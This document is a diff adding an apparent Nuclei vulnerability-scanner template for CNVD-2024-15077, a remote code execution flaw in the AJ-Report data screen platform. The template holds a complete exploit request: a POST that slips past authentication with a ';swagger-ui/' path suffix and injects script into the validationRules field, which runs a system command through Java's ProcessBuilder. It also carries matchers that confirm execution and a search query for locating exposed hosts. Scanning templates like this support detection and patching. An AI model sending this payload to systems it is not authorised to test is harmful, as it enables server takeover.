@@ -1,0 +1,56 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - code
+    - data
+  - part: body
+    regex:
+    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Type: application/json;charset=UTF-8
+
+
+    {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function
+    verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new
+    java.io.BufferedReader(new java.io.InputStreamReader(a));ss='''';while((line =
+    r.readLine()) != null){ss+=line};return ss;}"}
+
+    '
+id: CNVD-2024-15077
+info:
+  author: pussycat0x
+  classification:
+    cpe: cpe:2.3:a:anji-plus:aj-report:*:*:*:*:*:*:*:*
+  description: 'AJ Report The platform can execute commands in the corresponding value
+    of the validationRules parameter through post method, obtain server permissions,
+    and log in to the management background to take over the large screen. If it is
+    used by lawless elements to write reactionary slogans, the harmful consequences
+    will be very serious.
+
+    '
+  metadata:
+    fofa-query: title="AJ-Report"
+    max-request: 1
+    product: aj-report
+    vendor: anji-plus
+    verified: true
+  name: AJ-Report Open Source Data Screen - Remote Code Execution
+  reference:
+  - https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  - https://github.com/vulhub/vulhub/blob/master/aj-report/CNVD-2024-15077/README.md
+  severity: high
+  tags: cnvd,cnvd2024,aj-report,rce,vuln
